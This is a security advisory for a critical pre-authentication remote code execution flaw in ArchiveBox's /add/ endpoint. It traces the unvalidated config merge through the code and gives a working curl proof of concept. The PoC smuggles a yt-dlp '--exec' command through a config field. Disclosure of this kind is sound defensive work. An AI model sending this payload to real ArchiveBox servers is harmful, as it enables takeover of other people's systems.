# [C] ArchiveBox Vulnerable to RCE via unvalidated per-crawl config overrides in AddView

## Summary
Severity: Critical
Advisory: GHSA-3h23-7824-pj8r
CVE: CVE-2026-42601
CWE: CWE-88
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-3h23-7824-pj8r
Type: github-advisory

## Affected
- PyPI: `archivebox` — affected >=0

## Details
The /add/ endpoint (AddView in core/views.py) accepts a config JSON field that gets merged into the crawl config without validation. This config is exported as environment variables when archive plugins run, allowing injection of arbitrary tool arguments to achieve RCE.

When PUBLIC_ADD_VIEW=True (common for bookmarklet usage), this is exploitable without authentication. The endpoint is also @csrf_exempt.

Affected code:

core/views.py:887 - user config extracted with no validation:
  custom_config = form.cleaned_data.get("config") or {}

core/views.py:918 - merged into crawl config:
  config.update(custom_config)

config/configset.py:255-256 - crawl config applied with high priority:
  if crawl and hasattr(crawl, "config") and crawl.config:
      config.update(crawl.config)

hooks.py:398-411 - config exported as env vars:
  for key, value in config.items():
      if key in SKIP_KEYS: continue
      env[key] = str(value)

plugins/ytdlp/on_Snapshot__02_ytdlp.bg.py:122-123 - env var args passed to yt-dlp:
  ytdlp_args_extra = get_env_array("YTDLP_ARGS_EXTRA", [])
  cmd.extend(ytdlp_args_extra)

PoC (pre-auth when PUBLIC_ADD_VIEW=True):

  curl -X POST http://localhost:8000/add/ \
    -d "url=https://www.youtube.com/watch?v=dQw4w9WgXcQ" \
    -d "depth=0" \
    -d "config={\"YTDLP_ARGS_EXTRA\": \"[\\\"--exec\\\", \\\"id > /tmp/pwned\\\"]\"}" 

After the crawl runs, yt-dlp executes id > /tmp/pwned via its --exec flag.

Same approach works with GALLERYDL_ARGS_EXTRA (gallery-dl --exec), or overriding any *_BINARY key.

Impact: Remote code execution on the ArchiveBox server. Pre-auth when PUBLIC_ADD_VIEW=True.

## References
- https://github.com/ArchiveBox/ArchiveBox/security/advisories/GHSA-3h23-7824-pj8r
- https://nvd.nist.gov/vuln/detail/CVE-2026-42601
- https://github.com/ArchiveBox/ArchiveBox
- https://github.com/pypa/advisory-database/tree/main/vulns/archivebox/PYSEC-2026-283.yaml
- https://pypi.org/project/archivebox
